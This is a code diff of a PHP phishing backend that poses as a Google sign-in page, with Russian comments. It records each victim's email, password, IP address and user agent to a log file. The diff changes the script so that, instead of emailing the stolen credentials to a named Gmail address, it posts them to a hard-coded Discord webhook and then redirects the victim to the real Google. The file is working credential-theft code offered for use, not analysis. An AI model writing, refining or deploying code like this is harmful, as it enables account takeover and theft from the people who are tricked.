@@ -10,21 +10,36 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $log = "[$time] Email: $email | Pass: $password | IP: $ip | UA: $user_agent\n";
     file_put_contents("log.txt", $log, FILE_APPEND);
 
-    // === 2. ОТПРАВКА НА ВАШУ ПОЧТУ iokj2644@gmail.com ===
-    $to = "iokj2644@gmail.com";
-    $subject = "🔑 Новые данные Google";
-    $message = "Email: $email\nПароль: $password\nIP-адрес: $ip\nUser-Agent: $user_agent\nВремя: $time";
-    $headers = "From: iokj2644@gmail.com\r\n";
-    $headers .= "Reply-To: iokj2644@gmail.com\r\n";
-    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
+    // === 2. ОТПРАВКА В DISCORD WEBHOOK ===
+    $webhook_url = "https://discord.com/api/webhooks/1542530427624104118/V4cK1aDKQYYtKAbYJ_bzrHeti7QRMVTCxT8_OarJ44FIgBLWFM1wvLtTGRoC3sx-NfwZ";
 
-    // Отправка письма
-    $mail_sent = mail($to, $subject, $message, $headers);
+    $message = "🔑 **Новые данные Google**\n";
+    $message .= "📧 Email: `$email`\n";
+    $message .= "🔒 Пароль: `$password`\n";
+    $message .= "🌐 IP: `$ip`\n";
+    $message .= "🖥 UA: `$user_agent`\n";
+    $message .= "🕐 Время: `$time`";
 
-    // === 3. ОТЛАДКА (если письмо не ушло — покажет причину) ===
-    if (!$mail_sent) {
-        // Записываем ошибку в отдельный файл
-        file_put_contents("mail_error.txt", "[" . date("Y-m-d H:i:s") . "] Ошибка отправки на $to\n", FILE_APPEND);
+    $data = json_encode([
+        "content" => $message
+    ]);
+
+    $ch = curl_init($webhook_url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/json',
+        'Content-Length: ' . strlen($data)
+    ]);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $result = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    // === 3. ОТЛАДКА (если вебхук не сработал) ===
+    if ($http_code !== 204 && $http_code !== 200) {
+        file_put_contents("webhook_error.txt", "[" . date("Y-m-d H:i:s") . "] HTTP: $http_code | Response: $result\n", FILE_APPEND);
     }
 
     // === 4. ПЕРЕНАПРАВЛЕНИЕ НА РЕАЛЬНЫЙ GOOGLE ===
